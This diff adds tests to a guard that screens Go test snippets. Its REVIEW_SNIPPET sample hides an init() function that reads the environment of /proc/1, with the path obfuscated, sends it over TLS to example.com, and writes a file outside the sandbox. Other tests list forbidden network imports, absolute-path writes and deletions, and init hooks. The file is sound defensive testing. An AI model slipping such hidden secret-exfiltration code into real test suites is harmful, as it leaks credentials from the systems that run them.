@@ -110,3 +110,74 @@ def test_nan_inf_checks_have_no_false_positives():
         "\t_ = float64(math.Inf(1))\n\t_ = float32(math.NaN())\n\t_ = int(math.Floor(2.5))\n\t_ = myint(math.NaN())\n}"
     )
     assert check_snippet(snip(code=code, imports=("testing", "math")), MOD) == []
+
+
+# The blind review's snippet (Task 55): every technique passed the guard before.
+REVIEW_SNIPPET = (
+    "func init() {\n"
+    '\tp := filepath.Join("/", "pr"+"oc", "1", "environ")\n'
+    "\tdata, _ := os.ReadFile(p)\n"
+    '\tconn, err := tls.Dial("tcp", "example.com:443", nil)\n'
+    "\tif err == nil {\n\t\tconn.Write(data)\n\t}\n"
+    '\t_ = os.WriteFile("/app/app/zz.py", []byte("x"), 0o644)\n'
+    "}\n\n"
+    "func TestX(t *testing.T) {\n\tif 1+1 != 2 {\n\t\tt.Fatal(\"math\")\n\t}\n}\n"
+)
+REVIEW_IMPORTS = ("testing", "os", "path/filepath", "crypto/tls")
+
+
+def test_blind_review_snippet_is_rejected_for_every_technique():
+    problems = "\n".join(check_snippet(snip(code=REVIEW_SNIPPET, imports=REVIEW_IMPORTS), MOD))
+    for expected in ("crypto/tls", "filesystem root", "environ", "absolute path literal", "func init("):
+        assert expected in problems, expected
+
+
+def test_root_path_join_rejected():
+    for call in ('filepath.Join("/", "etc")', 'path.Join("/", "x")', "filepath.Join( `/` , \"x\")", 'filepath.Join("/")'):
+        bad = snip(code=f"func TestX(t *testing.T) {{ _ = {call} }}", imports=("testing", "path", "path/filepath"))
+        assert any("filesystem root" in p for p in check_snippet(bad, MOD)), call
+
+
+def test_network_packages_rejected():
+    for imp in ("crypto/tls", "golang.org/x/net", "golang.org/x/net/http2", "net", "net/http", "log/syslog"):
+        problems = check_snippet(snip(imports=["testing", imp]), MOD)
+        assert any(f"import {imp!r} is not allowed" in p for p in problems), imp
+
+
+def test_environ_string_literal_rejected():
+    for lit in ('"environ"', '"self/" + "environ"', "`/proc/1/environ`"):
+        bad = snip(code=f"func TestX(t *testing.T) {{ _ = {lit} }}")
+        assert any("environ" in p for p in check_snippet(bad, MOD)), lit
+    ok = snip(code="// os.Environ is never read\nfunc TestX(t *testing.T) { _ = environment }")
+    assert check_snippet(ok, MOD) == []
+
+
+def test_absolute_path_writes_rejected():
+    for call in ('os.WriteFile("/app/app/zz.py", nil, 0o644)', 'os.Create("/tmp/x")', "os.RemoveAll(`/work`)"):
+        bad = snip(code=f"func TestX(t *testing.T) {{ _ = {call} }}", imports=("testing", "os"))
+        assert any("absolute path literal" in p for p in check_snippet(bad, MOD)), call
+
+
+def test_init_and_testmain_rejected_with_actionable_messages():
+    bad = check_snippet(snip(code="func init() {}\nfunc TestX(t *testing.T) {}"), MOD)
+    assert any("`func init(` is not allowed" in p and "inside the Test functions" in p for p in bad)
+    bad = check_snippet(snip(code="func TestMain(m *testing.M) { m.Run() }\nfunc TestX(t *testing.T) {}"), MOD)
+    assert any("`func TestMain(` is not allowed" in p for p in bad)
+    # a method or a local closure named init is not a package init function
+    assert check_snippet(snip(code="func (s *S) init() {}\nfunc TestX(t *testing.T) { init := 1; _ = init }"), MOD) == []
+
+
+def test_new_rules_have_no_false_positives():
+    code = (
+        '// filepath.Join("/", "x") and "/proc/1/environ" in a comment are fine\n'
+        "func TestX(t *testing.T) {\n"
+        "\tdir := t.TempDir()\n"
+        '\tif err := os.WriteFile(filepath.Join(t.TempDir(), "x"), []byte("1"), 0o644); err != nil {\n\t\tt.Fatal(err)\n\t}\n'
+        '\t_ = filepath.Join(dir, "x")\n'
+        '\t_ = path.Join("a", "/")\n'
+        "\t/* path.Join(\"/\") */\n"
+        "\tif !math.IsNaN(math.NaN()) || strings.Index(\"a/b\", \"/\") != 1 {\n\t\tt.Fatal(\"x\")\n\t}\n}"
+    )
+    imports = ("testing", "os", "path", "path/filepath", "math", "strings", "errors", "fmt", "sort", "bytes",
+               "encoding/json", "time", "regexp", "strconv", "reflect")
+    assert check_snippet(snip(code=code, imports=imports), MOD) == []
